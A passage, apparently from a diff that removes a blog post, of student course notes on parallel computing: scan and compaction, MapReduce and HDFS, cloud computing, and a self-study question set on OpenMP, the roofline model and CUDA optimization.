-<p>Important properties for parallel reduction:</p>
-<ul>
-<li>Associativity: a+(b+c) == (a+b)+c</li>
-<li>Allows elements to be reduced in prarallel in a ‘tree’</li>
-</ul>
-<h2 id="Data_Parallel_Algorithms_-_Scan"><a href="#Data_Parallel_Algorithms_-_Scan" class="headerlink" title="Data Parallel Algorithms - Scan"></a>Data Parallel Algorithms - Scan</h2><p>Scan(prefix-sum): Takes a binary associative operator ⊕ with identity I, and an array of n elements [a0, a1, …, an-1] and returns the ordered set [I, a0, (a0⊕a1),…, (a0⊕a1⊕…⊕an-2)]</p>
-<p>Example:</p>
-<p>if ⊕ is addition, than scan on the set [3 1 7 0 4 1 6 3 ] returns the set [0 3 4 11 11 15 16 22]</p>
-<p>Scan Algorithm in CUDA 4.0</p>
-<h2 id="Data_Parallel_Algorithms_-_Compact"><a href="#Data_Parallel_Algorithms_-_Compact" class="headerlink" title="Data Parallel Algorithms - Compact"></a>Data Parallel Algorithms - Compact</h2><p>Compaction: Removing elements from an array - take in an array and produce an shorter array.</p>
-<p>How do we perform removal in parallel?</p>
-<ul>
-<li>Map - create flags (1 keep, 0 remove)</li>
-<li>Scan - compute index</li>
-<li>Map - copy to new array</li>
-</ul>
-<p><img src="/images/14543391583932.jpg" alt=""></p>
-<h2 id="Data_Parallel_Algorithms_-_FindUniq"><a href="#Data_Parallel_Algorithms_-_FindUniq" class="headerlink" title="Data Parallel Algorithms - FindUniq"></a>Data Parallel Algorithms - FindUniq</h2><p>FindUniq: Removing duplicates from an array - take in an set, produces an equal or smaller set of unique values</p>
-<p><img src="/images/14543391502961.jpg" alt=""></p>
-<p>在某些特殊情况可以利用 hash insertion 去掉 sort 的步骤, hash table 已经是有序的，就是打表的方法。</p>
-<h2 id="Parallel_Software_Patterns"><a href="#Parallel_Software_Patterns" class="headerlink" title="Parallel Software Patterns"></a>Parallel Software Patterns</h2><p>A parallel software pattern is a generalizable solution to a class of recurring problems that occurs in the design of parallel software.</p>
-<p>Attaches names to well-analyzed solutions that encapsulate the way an expert in the field solves problems.</p>
-<p>Aims to achieve three goals:</p>
-<ul>
-<li>Define a set of vocabularies to communicate</li>
-<li>Present a set of expert techniques for beginners to learn</li>
-<li>Allows experts to more quickly design complex systems</li>
-</ul>
-<p><a href="http://parlab.eecs.berkely.edu/wiki/patterns/patterns" target="_blank" rel="external">Our Pattern Language</a></p>
-<p>OPL: The Organization</p>
-<p><img src="/images/14543391400653.jpg" alt=""></p>
-<p>Structural Patterns:</p>
-<ul>
-<li>!Pipe-and-Filter</li>
-<li>Agent-and-Repository</li>
-<li>Event-based</li>
-<li>Layered Systems</li>
-<li>Model-view-constroller</li>
-<li>Arbitrary Task Graphs</li>
-<li>Puppeteer</li>
-<li>Iterator/BSP</li>
-<li>!MapReduce</li>
-</ul>
-<p>Monte Carlo Methods</p>
-<h3 id="Applications_to_Your_Term_Projects"><a href="#Applications_to_Your_Term_Projects" class="headerlink" title="Applications to Your Term Projects"></a>Applications to Your Term Projects</h3><p><img src="/images/14543391286447.jpg" alt=""></p>
-<h2 id="Distributed_Computing"><a href="#Distributed_Computing" class="headerlink" title="Distributed Computing"></a>Distributed Computing</h2><ul>
-<li>Speedup not necessarily from better algorithm, but from scale</li>
-<li>When an algorithms is converted to MapReduce it may operate significantly slower than sequential code on a single node</li>
-<li>Mapping algorithms to a MapReduce framework is the challenge</li>
-</ul>
-<h2 id="Big_Data"><a href="#Big_Data" class="headerlink" title="Big Data"></a>Big Data</h2><ul>
-<li>Web Data: Search, Advertisements, Behavioral data, Social graphs</li>
-<li>Computational Physics Experiments<ul>
-<li>Atomic Energy Research</li>
-<li>Numerical Wind Tunnels</li>
-</ul>
-</li>
-<li>The Earth Simulator<ul>
-<li>Global Climate Change Research</li>
-</ul>
-</li>
-<li>Weather Forecasting</li>
-<li>The Human Genome Project, AIDS Research</li>
-</ul>
-<h2 id="Distributed_and_Cloud_Computing"><a href="#Distributed_and_Cloud_Computing" class="headerlink" title="Distributed and Cloud Computing"></a>Distributed and Cloud Computing</h2><ul>
-<li>Distributed Computing<ul>
-<li>Using distributed systems to solve computational problems.</li>
-<li>Problem is divided in to many tasks, each of which is solved by one or more computers.</li>
-</ul>
-</li>
-<li>Cloud Computing<ul>
-<li>Distributed Computing on Cloud Resources</li>
-</ul>
-</li>
-</ul>
-<p>Distributed Computing on Cloud Computing Infrastructure = Scalable Computing</p>
-<h2 id="Scalabel_Computing"><a href="#Scalabel_Computing" class="headerlink" title="Scalabel Computing"></a>Scalabel Computing</h2><ul>
-<li>Embarrassingly parallel problems<ul>
-<li>Shared Nothing Architecture</li>
-</ul>
-</li>
-<li>Two dimensions of scalability<ul>
-<li>Data: Given twice the amount of data, the same algorithm should take no more than twice as long to run</li>
-<li>Resources: Given a cluster of twice the size, the same algorithm should take no more than half as long to run</li>
-</ul>
-</li>
-</ul>
-<h2 id="Big_Data-1"><a href="#Big_Data-1" class="headerlink" title="Big Data"></a>Big Data</h2><ul>
-<li>Decompose the original problem in smaller, parallel tasks</li>
-<li>Schedule tasks on workers distributed in a cluster<ul>
-<li>Data locality</li>
-<li>Resource availability</li>
-</ul>
-</li>
-<li>Ensure Workers get the data they need</li>
-<li>Coordinate synchronization among workers</li>
-<li>Share partial results</li>
-<li>Handle failures</li>
-<li>Implementation details are complex</li>
-<li>Shared memory approach(OpenMP)<ul>
-<li>Developer needs to take case of almost everything</li>
-<li>Synchronization, Concurrency</li>
-<li>Resource Allocation</li>
-</ul>
-</li>
-<li>MapReduce: a shared nothing approach<ul>
-<li>Most of the above issures are taken care of</li>
-<li>Problem decomposition and sharing partial results need particular attention</li>
-<li>Optimization(memory and network consumption) are tricky</li>
-</ul>
-</li>
-</ul>
-<h2 id="Failures_in_Distributed_Computing"><a href="#Failures_in_Distributed_Computing" class="headerlink" title="Failures in Distributed Computing"></a>Failures in Distributed Computing</h2><ul>
-<li>In large-scale distriuted computing, failure is ensured</li>
-<li>Without fail-safe mechanisms distributed computing cannot work</li>
-<li>HADOOP: MapReduce + HDFS(Hadoop Distributed Filesystem)<ul>
-<li>Fail-safe Storage: By default stores 3 separate copies of each block</li>
-<li>Fail-safe Task Management: Failed tasks re-scheduled up to 4 times</li>
-</ul>
-</li>
-</ul>
-<p>-&gt; Reliable and scalable computing</p>
-<h2 id="HADOOP_-_26gt_3B_MapReduce"><a href="#HADOOP_-_26gt_3B_MapReduce" class="headerlink" title="HADOOP -&gt; MapReduce"></a>HADOOP -&gt; MapReduce</h2><ul>
-<li>What is MapReduce?<ul>
-<li>A programming model<ul>
-<li>Inspired by function programming</li>
-<li>Model to express distributed computations on massive amounts of data</li>
-</ul>
-</li>
-<li>An execution framework<ul>
-<li>Designed for large-scale data processing</li>
-<li>Designed to run on clusters of commodity hardware</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Separate the what from how<ul>
-<li>Abstract away the “distributed” part of the system -&gt; handled by framework</li>
-</ul>
-</li>
-<li>For optimal performance knowledge of framework is key<ul>
-<li>Custom data reader/writer</li>
-<li>Custom data partitioning</li>
-<li>Memory utilization</li>
-</ul>
-</li>
-</ul>
-<h3 id="Map__26amp_3B_Reduce"><a href="#Map__26amp_3B_Reduce" class="headerlink" title="Map &amp; Reduce"></a>Map &amp; Reduce</h3><ul>
-<li>Map: (map operation in functional programming)<ul>
-<li>Transformation over a dataset</li>
-<li>Apply a function f(x) to all elements in isolation</li>
-<li>The application of f(x) to each element of a dataset can be parallelized in a straightforward manner</li>
-</ul>
-</li>
-<li>Reduce: (fold operation in functional programming)<ul>
-<li>Aggregation operation defined by a function g(x)</li>
-<li>Data locality: elements in the list brought together</li>
-<li>If we can group elements of the list, then reduce phase can proceed in parallel</li>
-</ul>
-</li>
-<li>The framework coordinates the map and reduce phases<ul>
-<li>How intermediate results are grouped for the reduce to happen in parallel</li>
-</ul>
-</li>
-</ul>
-<h3 id="Designing_a_MapReduce_algorithm"><a href="#Designing_a_MapReduce_algorithm" class="headerlink" title="Designing a MapReduce algorithm"></a>Designing a MapReduce algorithm</h3><ul>
-<li>Key-value pairs are the basic data structures in MapReduce<ul>
-<li>Keys and values can be: integers, strings, arbitrary data structures</li>
-</ul>
-</li>
-<li>The design of a MapReduce algorithm involves:<ul>
-<li>Define a key-value structures for application</li>
-<li>Define mapper and reducer functions<ul>
-<li>map: (k1,v1)-&gt;[(k2,v2)]</li>
-<li>reduce: (k2,[v2]) -&gt; [(k3,v3)]</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="A_MapReduce_Job"><a href="#A_MapReduce_Job" class="headerlink" title="A MapReduce Job"></a>A MapReduce Job</h3><ul>
-<li>Dataset: stored on the underlying distributed filesystem<ul>
-<li>Split across files and across machines</li>
-</ul>
-</li>
-<li>Mapper: The mapper is applied to every input key-value pair to generate intermediate key-value pairs</li>
-<li>Reducer: The reducer is applied to all values associated with the same intermediate key to generate output key-value pairs</li>
-<li>A distributed “group by” operation is implicitly performed between the map and reduce phases<ul>
-<li>Intermediate data arrives at each reducer in order, sorted by the key</li>
-<li>No ordering is guaranteed across reducers</li>
-</ul>
-</li>
-<li>Output Keys from reducers are written to distributed filesystem</li>
-<li>Intermediate keys are transient</li>
-</ul>
-<h3 id="Simplified_View_of_MapReduce"><a href="#Simplified_View_of_MapReduce" class="headerlink" title="Simplified View of MapReduce"></a>Simplified View of MapReduce</h3><ul>
-<li>Mappers applied to all input key-value pairs -&gt; generate intermediate pairs</li>
-<li>Reducers applied to all intermediate values associated with the same intermediate key</li>
-<li>Between map and reduce lies a barrier that involves a large distributed sort and group by</li>
-</ul>
-<h3 id="Word_Count_in_MapReduce"><a href="#Word_Count_in_MapReduce" class="headerlink" title="Word Count in MapReduce"></a>Word Count in MapReduce</h3><ul>
-<li>Define the appropriate key-value structures?<ul>
-<li>Input (docid, doc)</li>
-<li>Mapper (word, 1)</li>
-<li>Output (word, C(word))</li>
-</ul>
-</li>
-<li>Define Mapper and Reducer functions<ul>
-<li>Mapper: tokenize the document, outputs key-value (word, 1)</li>
-<li>The framework guarantees all values associated with the same key(word) are brought to the same reducer</li>
-<li>Reducer: receives all values associated to some key (word)</li>
-<li>Sums the values and writes output key-value pairs(word, C(word))</li>
-</ul>
-</li>
-</ul>
-<h3 id="Implementation_Details"><a href="#Implementation_Details" class="headerlink" title="Implementation Details"></a>Implementation Details</h3><ul>
-<li>A partitioned is in charge of assigning intermediate keys(words) to reducers<ul>
-<li>Partitioner can be customized</li>
-</ul>
-</li>
-<li>How many map and reduce tasks?<ul>
-<li>The framework essentially takes care of map tasks</li>
-<li>The designer/developer takes care of reduce tasks</li>
-</ul>
-</li>
-</ul>
-<h3 id="A_MapReduce_Job_on_Hadoop"><a href="#A_MapReduce_Job_on_Hadoop" class="headerlink" title="A MapReduce Job on Hadoop"></a>A MapReduce Job on Hadoop</h3><p>Master-slave architecture</p>
-<ul>
-<li>JobTrackerNode creating object for the job, determines number of mappers/reduces, schedules jobs, bookkeeping tasks’ status and progress</li>
-<li>TaskTrackerNode: slaves manages individual tasks</li>
-</ul>
-<h2 id="HADOOP_-_26gt_3B_HDFS"><a href="#HADOOP_-_26gt_3B_HDFS" class="headerlink" title="HADOOP -&gt; HDFS"></a>HADOOP -&gt; HDFS</h2><ul>
-<li>Improve computing throughput by co-locating data and computation</li>
-<li>Abandon the separation between compute and storage nodes<ul>
-<li>Not mandatory but highly desirable for MapReduce computing</li>
-</ul>
-</li>
-<li>Distributed filesystems:<ul>
-<li>Write once, read many workloads</li>
-<li>Does not handle concurrency, but allows replication</li>
-<li>Optimized for throughput not latency</li>
-</ul>
-</li>
-<li>HDFS(Hadoop Distributed FileSystem)<ul>
-<li>Tailored to the specific requirements of MapReduce</li>
-</ul>
-</li>
-</ul>
-<h3 id="HDFS_I/O"><a href="#HDFS_I/O" class="headerlink" title="HDFS I/O"></a>HDFS I/O</h3><ul>
-<li>A typical read from a client involves:<ul>
-<li>Contact the NameNode to determine where the actual data is stored</li>
-<li>NameNode replies with block identifiers and locations(which DataNode)</li>
-<li>Contact the DataNode to fetch data</li>
-</ul>
-</li>
-<li>A typical write from a client invovles:<ul>
-<li>Contact the NameNode to update the namespace and verify permissions</li>
-<li>NameNode allocates a new block on a suitable DataNode</li>
-<li>The client directly streams to the selected DataNode</li>
-<li>HDFS files are immutable</li>
-</ul>
-</li>
-<li>Data is never moved through the NameNode -&gt; no bottleneck</li>
-</ul>
-<h3 id="HDFS_Replication"><a href="#HDFS_Replication" class="headerlink" title="HDFS Replication"></a>HDFS Replication</h3><ul>
-<li>By default, HDFS stores 3 separate copies of each block<ul>
-<li>Ensures reliability, availability and performance</li>
-</ul>
-</li>
-<li>Replication policy<ul>
-<li>Spread replicas across different racks -&gt; Robust against cluster node and rack failures</li>
-</ul>
-</li>
-<li>Block replication benefits MapReduce<ul>
-<li>Scheduling decisions can take replicas into account</li>
-<li>Exploit better data locality</li>
-</ul>
-</li>
-<li>HDFS also transparently checksums all data during I/O</li>
-</ul>
-<h3 id="HDFS_Constraints"><a href="#HDFS_Constraints" class="headerlink" title="HDFS Constraints"></a>HDFS Constraints</h3><ul>
-<li>Input splits for MapReduce based on individual files<ul>
-<li>Mappers are launched for every file</li>
-<li>High startup correctness</li>
-<li>Inefficient “shuffle and sort”</li>
-</ul>
-</li>
-</ul>
-<p>Small number of large files preferred over a large number of small files</p>
-<h2 id="Cloud_Computing_-_Advantages"><a href="#Cloud_Computing_-_Advantages" class="headerlink" title="Cloud Computing - Advantages"></a>Cloud Computing - Advantages</h2><ul>
-<li>Illusion of infinite computing resources on demand</li>
-<li>Elimination of an up-front commitment by user</li>
-<li>Ability to pay for use of computing resources on a short-term basis as needed</li>
-<li>Lowering entry barrier for large scale computing<ul>
-<li>Removing equipment fixed cost</li>
-</ul>
-</li>
-<li>Making available economy-of-scale<ul>
-<li>Reducing operating variable cost</li>
-</ul>
-</li>
-</ul>
-<h2 id="Developing_Algorithms_in_Hadoop"><a href="#Developing_Algorithms_in_Hadoop" class="headerlink" title="Developing Algorithms in Hadoop"></a>Developing Algorithms in Hadoop</h2><ul>
-<li>Algorithm development involves:<ul>
-<li>preparing the input data</li>
-<li>Implement the mapper and the reducer</li>
-<li>Optionally, design the combiner and the partitioner</li>
-</ul>
-</li>
-<li>How to recast existing algorithms in MapReduce?<ul>
-<li>It is not always obvious how to express algorithms</li>
-<li>Data structures play an important role</li>
-<li>Optimization is hard</li>
-</ul>
-</li>
-<li>Developer needs to understand the framework</li>
-<li>Learn by examples<ul>
-<li>Design Patterns</li>
-<li>Synchronization is most trick aspect</li>
-</ul>
-</li>
-</ul>
-<h2 id="Efficiency_2C_Bottlenecks__26amp_3B_Precautions"><a href="#Efficiency_2C_Bottlenecks__26amp_3B_Precautions" class="headerlink" title="Efficiency, Bottlenecks &amp; Precautions"></a>Efficiency, Bottlenecks &amp; Precautions</h2><ul>
-<li>Efficiency<ul>
-<li>Reduces I/O bandwidth(number of intermediate key-value pairs)</li>
-<li>Un-necessary object creation and destruction(garbage collection)</li>
-</ul>
-</li>
-<li>Bottlenecks<ul>
-<li>In-mapper combining depends on having sufficient memory</li>
-<li>Multiple threads compete for same resources</li>
-</ul>
-</li>
-<li>Precautions<ul>
-<li>Breaks functional programming paradigm due to state preservation</li>
-<li>Preserving state -&gt; algorithm behavior might depend on execution order</li>
-</ul>
-</li>
-</ul>
-<h2 id="How_do_you_interpret_speedup_results_3F"><a href="#How_do_you_interpret_speedup_results_3F" class="headerlink" title="How do you interpret speedup results?"></a>How do you interpret speedup results?</h2><p>Based on the PALLAS paper from UC Berkeley</p>
-<ul>
-<li>(SW) Application Developers<ul>
-<li>Provide end-user with new capabilites within cost constraints</li>
-<li>Concerned about a specific subset of applications at a time</li>
-<li>Pragmatic towards processor platform choices</li>
-<li>Gains no value from documenting multiple implementation platforms</li>
-<li><strong>Platform as a black box</strong></li>
-</ul>
-</li>
-<li>(HW) Architecture Researchers<ul>
-<li>Develop new micro-architectures features for next-gen processors</li>
-<li>Understand the pros and cons of architectural features of a <strong>broad range</strong> of platform for a <strong>broad range</strong> of applications</li>
-<li>Use <strong>toy problems</strong> to exercise all features</li>
-<li><strong>Application as a black box</strong></li>
-</ul>
-</li>
-</ul>
-<h2 id="Computational_Finance"><a href="#Computational_Finance" class="headerlink" title="Computational Finance"></a>Computational Finance</h2><p>Use Value-at-Risk(VaR) estimates - based on Monte Carlo methods Pattern.</p>
-<ul>
-<li><p>VaR</p>
-<ul>
-<li>Maximum expected loss that will not be exceeded</li>
-<li>under normal market considerations</li>
-<li>over a predetermined period</li>
-<li>at a given confidence level</li>
-</ul>
-</li>
-<li><p>Different Optimization Across Platforms</p>
-<ul>
-<li>Oganization &amp; Structure: Reduce Computation</li>
-<li>Algorithm Strategies: Fast Convergence</li>
-<li>Implementation Strategies: Saving Memory BW / Kernel Merge Vectorization</li>
-</ul>
-</li>
-</ul>
-<h2 id="Speedup"><a href="#Speedup" class="headerlink" title="Speedup"></a>Speedup</h2><p>Before: Performance x  – After: Performance y – ROI(speedup): y/x</p>
-<h2 id="Term_Project_Report"><a href="#Term_Project_Report" class="headerlink" title="Term Project Report"></a>Term Project Report</h2><ul>
-<li>Clearly describe what is the <strong>baseline</strong> you are comparing to, in terms of:<ul>
-<li>Platform used</li>
-<li>Software architecture</li>
-<li>Algorithm strategies</li>
-<li>Implementation strategies</li>
-</ul>
-</li>
-<li>Present your speed ups, which is often <strong>NOT</strong> only the result of differences in the processor or the platform, but also include:<ul>
-<li>Differences in application architecture</li>
-<li>Differences in algorithm strategy</li>
-<li>Differences in implementation strategy techniques</li>
-<li>Differences in the fine-tuning of parameters</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h1 id="Question_Set"><a href="#Question_Set" class="headerlink" title="Question Set"></a>Question Set</h1><h2 id="Module_1-2"><a href="#Module_1-2" class="headerlink" title="Module 1.2"></a>Module 1.2</h2><ul>
-<li>What are the differences between multicore and manycore processors?<ul>
-<li>Multicore: yoke of oxen. Each core optimized for executing a single thread.</li>
-<li>Manycore: flock of chickens. Cores optimized for aggregate throughput, deemphasizing individual performance.</li>
-</ul>
-</li>
-<li>What is instruction level parallelism? What is SIMD?<ul>
-<li>ILP: Instructions in a sequence that can be computed at the same time.</li>
-<li>ILP(wiki): a measure of how many of the operations in a computer program can be performed simultaneously</li>
-<li>SIMD(wiki): computers with multiple processing elements that perform the same operation on multiple data points simultaneously. data level parallelism. </li>
-</ul>
-</li>
-<li>What is simultaneous multithreading?<ul>
-<li>a technique for improving the overall efficiency of superscalar CPUs with hardware multithreading. SMT permits multiple independent threads of execution to better utilize the resources provided by modern processor architectures.</li>
-</ul>
-</li>
-<li>What are the three metrics for a memory hierarchy?<ul>
-<li>Capacity: Size, e.g. number of bytes of data</li>
-<li>Latency: From start to finish, in units of time, e.g. CPU clock cycles</li>
-<li>Throughput: Tasks accomplished per unit time, e.g. GB/s</li>
-</ul>
-</li>
-<li>What are the different system granularity?<ul>
-<li>Remote Procedure Call based Implementations</li>
-<li>MPI-based Implementations</li>
-<li>Pthread-based Implementations</li>
-<li>Multicore Task Queue-based Implementations</li>
-<li>Manycore Throughput Optimized Implementations</li>
-</ul>
-</li>
-</ul>
-<h2 id="Module_1-3"><a href="#Module_1-3" class="headerlink" title="Module 1.3"></a>Module 1.3</h2><ul>
-<li>What is the different between concurrency and parallelism?<ul>
-<li>Concurrency: We expose concurrency in our application</li>
-<li>Parallelism: We exploit parallelism in our platform</li>
-</ul>
-</li>
-<li>What are the four key elements of the human problem solving process?<ul>
-<li>Understand the current state</li>
-<li>Observe the internal representation</li>
-<li>Search among alternatives</li>
-<li>Select from a set of choices</li>
-</ul>
-</li>
-<li>What are the characteristics of a current algorithm implementation?<ul>
-<li>Efficiency</li>
-<li>Simplicity</li>
-<li>Portablility</li>
-<li>Scalability</li>
-</ul>
-</li>
-<li>What levels of concurrency can be exposed in the kmeans algorithm?<ul>
-<li>Expectation: N(independent) k(min reduction) D(sum reduction)</li>
-<li>Maximization: D(independent) N(Histogram computation into k bins)</li>
-</ul>
-</li>
-<li>What levels of parallelism are available to be exploited?<ul>
-<li>Core level Parallelism</li>
-<li>SIMD level parallelism</li>
-</ul>
-</li>
-<li>What mapping between concurrency and parallelism can be explored?<ul>
-<li>One level of concurrency could map to multiple levels of parallelism</li>
-<li>SIMD &amp; core-level parallelism across data-points<ul>
-<li>Update membership for each data point sequentially</li>
-<li>Histogram computation</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="Module_2-1"><a href="#Module_2-1" class="headerlink" title="Module 2.1"></a>Module 2.1</h2><ul>
-<li>What are the exploitable levels of parallelism in a multicore processor?<ul>
-<li>SIMD-Level: using vectorizing compiler and hand-code intrinsics</li>
-<li>SMT-Level: OS abstract it to core-level parallelism</li>
-<li>Core-Level: Using threads to describe work done on different cores</li>
-</ul>
-</li>
-<li>What is SPMD? And how to use OpenMP to do SPMD?<ul>
-<li>OpenMP - Pthread-based Implementations(granularity)</li>
-<li>SPMD(wiki): SPMD (single program, multiple data) is a technique employed to achieve parallelism; it is a subcategory of MIMD. Tasks are split up and run simultaneously on multiple processors with different input in order to obtain results faster.</li>
-<li>OpenMP managed <strong>Fork-Join</strong> Parallelism to do SPMD</li>
-</ul>
-</li>
-<li>What is the difference between critical and atomic?<ul>
-<li>critical: 并行程序块，同时只能有一个线程能访问该并行程序块</li>
-<li>atomic: 只适用于两种情况：自加减操作以及基本的操作符</li>
-<li>critical 与 atomic 的区别在于，atomic 仅适用于两种基本类型操作，而且 atomic 所防护的仅为一句代码。critical 可以对某个并行程序块进行防护。</li>
-</ul>
-</li>
-<li>How to reduce synchronization cost and avoid false sharing?<ul>
-<li>Be aware of the cache line sizes for a platform</li>
-<li>Avoid accessing the same cache line from different threads</li>
-</ul>
-</li>
-<li>What are the scheduling, reduction, data sharing, and synchronization options for OpenMP?<ul>
-<li>scheduling<ul>
-<li>static</li>
-<li>dynamic</li>
-<li>guided</li>
-</ul>
-</li>
-<li>data sharing<ul>
-<li>shared</li>
-<li>private</li>
-<li>firstprivate</li>
-<li>lastprivate</li>
-</ul>
-</li>
-<li>synchronization<ul>
-<li>ordered</li>
-<li>barrier</li>
-<li>single</li>
-<li>nowait</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="21_21_Module_2-2"><a href="#21_21_Module_2-2" class="headerlink" title="!! Module 2.2"></a>!! Module 2.2</h2><ul>
-<li>Why naive matrix-multiply does not achieve peak performance on the CPU?<ul>
-<li>Deep memory hierarchy</li>
-<li>Pipeline, ILP</li>
-<li>Free operations are not free</li>
-</ul>
-</li>
-<li>What are the different data layouts for matrices?<ul>
-<li>Column major</li>
-<li>Row major</li>
-</ul>
-</li>
-<li>What is cache blocking? Why do we need it?</li>
-<li>Is blocking sufficient? What more can we do?<ul>
-<li>Strength reduction</li>
-<li>Function inlining</li>
-<li>Loop unrolling</li>
-<li>Common subexpression elimination</li>
-<li>Load/Store elimination</li>
-<li>Table lookups</li>
-<li>Branch elimination</li>
-</ul>
-</li>
-</ul>
-<h2 id="Module_2-3"><a href="#Module_2-3" class="headerlink" title="Module 2.3"></a>Module 2.3</h2><ul>
-<li>What is the roofline model? What are the metrics and axis used?<ul>
-<li>Roofline model: a pedagogical tool for program analysis and optimization</li>
-<li>Metric of interest: DRAM bandwidth(GB/s)</li>
-<li>y-axis: FLOPs; x-axis: AI</li>
-</ul>
-</li>
-<li>What is the difference between “flop’s per memory instruction” from “flop’s per DRAM byte”?<ul>
-<li>?</li>
-</ul>
-</li>
-<li>Consider an image <code>Image[height][width]</code>. If one were to stride through the columns of values, what would be the effects? How would they be mapped to the roofline?<ul>
-<li>?</li>
-</ul>
-</li>
-<li>How does one model incomplete SIMDization (e.g. half the flop’s can be SIMDized). insufficient ILP(some dependent flop’s), or an imbalance between FDMUL’s and FPADD’s on the roofline?<ul>
-<li>See the complete graph below</li>
-</ul>
-</li>
-<li>How would one model {branch mispredicts, TLB misses, or too many streams for the prefetchers} on the roofline.<ul>
-<li>See the complete graph below</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/14543392317490.jpg" alt=""></p>
-<h2 id="Module_3-1"><a href="#Module_3-1" class="headerlink" title="Module 3.1"></a>Module 3.1</h2><ul>
-<li>What’s the Difference between Multicore and Manycore?<ul>
-<li>Multicore: yoke of oxen. Each core optimized for executing a single thread.</li>
-<li>Manycore: flock of chickens. Cores optimized for aggregate throughput, deemphasizing individual performance.</li>
-</ul>
-</li>
-<li>When does using a GPU make sense?<ul>
-<li>Application with a lot of concurrency (1000-way, fine-grained concurrency)</li>
-<li>Some memory intensive applications (Aggregate memory bandwidth is higher)</li>
-<li>Advantage diminishes when task granularity becomes too large to fit in shared memory</li>
-</ul>
-</li>
-<li>What is the memory hierarchy inversion? And why is it there?<ul>
-<li>Memory hierarchy inversion: more registers than shared memory</li>
-<li>Single thread won’t see inverse hierarchy</li>
-<li>Inversion comes from parallelism</li>
-<li>Registers scale with SIMD and multithreading (Shared memory/L1 cache don’t have to)</li>
-</ul>
-</li>
-<li>What is the memory wall? How to get around it?<ul>
-<li>Memory wall: Increasing gap between Processor and DRAM performance</li>
-<li>Many core Processors utilize application concurrency to hide memory latency (aka get around the memory wall)</li>
-</ul>
-</li>
-<li>Why warps?<ul>
-<li>Software abstract info hid an extra level of architecture complexity</li>
-<li>A 128KB register file is a large memory (takes more than one cycle)</li>
-<li>Hardware provide 160wide physical SIMD units, half-pump register files</li>
-<li>To simplify the programming model</li>
-</ul>
-</li>
-<li>How do we deal with GPUs of different sizes?<ul>
-<li>CUDA provides an abstract infor concurrency to be fully exposed</li>
-<li>HW/Runtime provides capability to schedule the computation</li>
-</ul>
-</li>
-<li>What are the implications of the thread block abstraction?<ul>
-<li>Computation is grouped into blocks of independent concurrently execrable work</li>
-<li>Fully exposed the concurrency in the application</li>
-<li>The HW/Runtime makes the decision to selectively sequentialize the execution as necessary</li>
-</ul>
-</li>
-<li>How do threads communicate with each other?<ul>
-<li>Shared Memory</li>
-<li>Manycore processors provide memory local to each core</li>
-<li>Computations in SIMD-lanes in the same core can communicate via memory read / write</li>
-</ul>
-</li>
-<li>What is the caveat in synchronizing threads in a thread block?<ul>
-<li><code>__syncthreads()</code> 必须在每个线程中都能执行到，而不能有的有有的没有</li>
-</ul>
-</li>
-</ul>
-<h2 id="Module_3-2"><a href="#Module_3-2" class="headerlink" title="Module 3.2"></a>Module 3.2</h2><ul>
-<li>What are the three ways to improve execution throughput?<ul>
-<li>Maximizing Memory Throughput<ul>
-<li>SoA vs AoS</li>
-<li>Memory coalescing</li>
-<li>Use of shared memory</li>
-<li>Memory bank conflict</li>
-<li>Padding</li>
-</ul>
-</li>
-<li>Maximizing Instruction Throughput<ul>
-<li>Branch divergence</li>
-<li>Optimize instruction mix</li>
-</ul>
-</li>
-<li>Maximizing Scheduling Throughput</li>
-</ul>
-</li>
-<li>When to use SOA vs AOS?<ul>
-<li>Unfortunately, the SoA form is not ideal in all circumstances. For random or incoherent circumstances, gathers are used to access the data and the SoA form can result in extra unneeded data being read into cache, thus reducing performance. In this case, use of the AoS form instead will result in a smaller working set and improved performance. Generally, though, if the computation is to be vectorized, the SoA form is preferred.</li>
-</ul>
-</li>
-<li>What is memory coalescing? When to use it? Why is it important?<ul>
-<li>Memory coalescing: combine multiple memory accesses generated from multiple threads into a single physical transaction</li>
-<li>Hardware Constraint: DRAM is accessed in ‘segments’ of 32B/64B/128B</li>
-</ul>
-</li>
-<li>What is shared memory? How to use it?<ul>
-<li>Manycore processors provide memory local to each core</li>
-<li><code>__share__</code></li>
-</ul>
-</li>
-<li>What is memory bank conflict? How to work around it?<ul>
-<li>A bank conflict occurs if two or more threads access any bytes within different 32-bit words belonging to the same bank.</li>
-<li>If each thread in a halfwarp accesses successive 32bit values there are no bank conflicts.</li>
-</ul>
-</li>
-<li>What is branch divergence?<ul>
-<li>threads of a warp diverge via a data-dependent conditional branch</li>
-</ul>
-</li>
-<li>How to optimize for instruction mix?<ul>
-<li>Compiler Assisted Loop Unrolling</li>
-<li>#pragma unroll</li>
-</ul>
-</li>
-<li>What is occupancy? How to model/measure it?<ul>
-<li>Occupancy: Ability of a CUDA kernel to occupy concurrent contexts in a SM</li>
-<li>CUDA Occupancy Calculator</li>
-<li><code>--ptxas-options=-v</code></li>
-</ul>
-</li>
-<li>How to use the code profiler with CUDA?<ul>
-<li>CUDA Profiler Tutorial by Erik Reed</li>
-</ul>
-</li>
-</ul>
-<h2 id="Module_3-3"><a href="#Module_3-3" class="headerlink" title="Module 3.3"></a>Module 3.3</h2><ul>
-<li>What are the important properties of a Map function?<ul>
-<li>Side-effect free: Only returning a value, no modifications of state with the rest of the application</li>
-<li>Independent: Has an independent piece of work, where its input does not depend on another function</li>
-</ul>
-</li>
-<li>What are the important properties of a Reduce function?<ul>
-<li>Associativity: a+(b+c) == (a+b)+c</li>
-<li>Allows elements to be reduced in prarallel in a ‘tree’</li>
-</ul>
-</li>
-<li>What are the important properties of s Scan function?<ul>
-<li>return a ordered set</li>
-</ul>
-</li>
-<li>How to compact an array in a data-parallel way?<ul>
-<li>Map - create flags (1 keep, 0 remove)</li>
-<li>Scan - compute index</li>
-<li>Map - copy to new array</li>
-</ul>
-</li>
-<li>How to find unique elements in an array in a data-parallel way?<ul>
-<li>Sort</li>
-<li>Map - create flags (1 keep, 0 remove)</li>
-<li>Scan - compute index</li>
-<li>Map - copy to new array</li>
-</ul>
-</li>
-</ul>
-<h2 id="Module_3-4"><a href="#Module_3-4" class="headerlink" title="Module 3.4"></a>Module 3.4</h2><ul>
-<li>What are parallel software patterns?</li>
-<li>What are the three goals the software patterns aim to achieve?</li>
